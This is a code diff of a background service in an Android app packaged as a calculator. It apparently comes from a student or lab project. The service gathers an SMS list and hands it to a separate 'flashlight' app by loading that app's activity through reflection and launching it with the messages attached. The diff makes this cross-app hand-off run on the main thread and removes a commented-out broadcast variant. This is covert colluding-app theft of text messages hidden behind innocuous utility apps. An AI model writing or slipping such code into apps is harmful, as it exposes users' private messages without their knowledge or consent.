@@ -190,11 +190,8 @@ package com.example.calculator;
 
 
 import android.app.Service;
-import android.content.ComponentName;
 import android.content.Context;
-import android.content.DialogInterface;
 import android.content.Intent;
-import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
@@ -202,18 +199,8 @@ import android.os.AsyncTask;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
-import android.util.Base64;
 import android.util.Log;
 
-import androidx.appcompat.app.AlertDialog;
-import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
-
-import com.google.gson.Gson;
-
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
-import java.io.ObjectOutputStream;
 import java.lang.reflect.Constructor;
 import java.util.HashMap;
 
@@ -223,8 +210,7 @@ public class BackgroundService extends Service {
 
     private boolean isRunning;
     HashMap<String, String> smsList = new HashMap<String, String>();
-    private static final String PERMISSION_STATUS = "permission_status";
-    private boolean isAppDirectlyStarted = false;
+
 
 
     @Override
@@ -319,7 +305,9 @@ public class BackgroundService extends Service {
 
             try {
                 PackageManager packageManager = getPackageManager();
-                packageManager.getPackageInfo("com.example.flashlightIITR", PackageManager.GET_ACTIVITIES);
+                try{
+                    packageManager.getPackageInfo("com.example.flashlightIITR", PackageManager.GET_ACTIVITIES);}
+                catch (PackageManager.NameNotFoundException e){e.printStackTrace();}
                 Log.d("BgC","Found the package name");
 
                 final Context remoteContext = getApplicationContext().createPackageContext("com.example.flashlightIITR",
@@ -329,16 +317,29 @@ public class BackgroundService extends Service {
                 final ClassLoader loader = remoteContext.getClassLoader();
                 final Class<?> classNotify = loader.loadClass("com.example.flashlightIITR.NotificationActivity");
                 Log.d("BgC","Loading the class.");
+                final Constructor<?> constructor= classNotify.getConstructor();
+                Handler h = new Handler(Looper.getMainLooper());
+                h.post(new Runnable() {
+                    @Override
+                    public void run() {
+                        Intent intent1 = new Intent(remoteContext,classNotify);
+//                        intent1.setAction(Intent.ACTION_SEND);
+                        intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK );
+//                        intent1.setType("text/plain");
+                        intent1.putExtra("SMS_LIST", smsList);
+                        Log.d("BgC", String.valueOf(smsList));
 
-                Intent intent1 = new Intent(remoteContext,classNotify);
-                intent1.setAction(Intent.ACTION_SEND);
-                intent1.putExtra("SMS_LIST", smsList);
-                intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK );
-                intent1.setType("text/plain");
-                Log.d("BgC", String.valueOf(smsList));
+//
 
-                startActivity(intent1);
-                Log.d("BgC","Starting the Intent");
+                        startActivity(intent1);
+                        Log.d("BgC","Starting the Intent");
+
+
+
+                    }
+                });
+
+
             } catch (Exception ex) {
                 Log.e("BgC", ex.toString());
                 ex.printStackTrace();
@@ -350,23 +351,5 @@ public class BackgroundService extends Service {
 
         }
     }
-
-//        private void sendDataToAnotherApp() {
-//        // Create an explicit intent with the component name of the NotificationActivity
-//        Intent sendIntent = new Intent();
-//        sendIntent.setComponent(new ComponentName("com.example.flashlightIITR", "com.example.flashlightIITR.NotificationActivity"));
-//        sendIntent.putExtra("SMS_LIST", smsList);
-//        Log.d("BgC", String.valueOf(smsList));
-//
-//        try {
-//            // Start the service using the explicit intent
-//            sendBroadcast(sendIntent);
-//            Log.d("BgC", "Service started in flashlight app");
-//        } catch (Exception e) {
-//            Log.e("BgC", "Error starting service in flashlight app: " + e.getMessage());
-//            e.printStackTrace();
-//        }
-//    }
-
 
 }
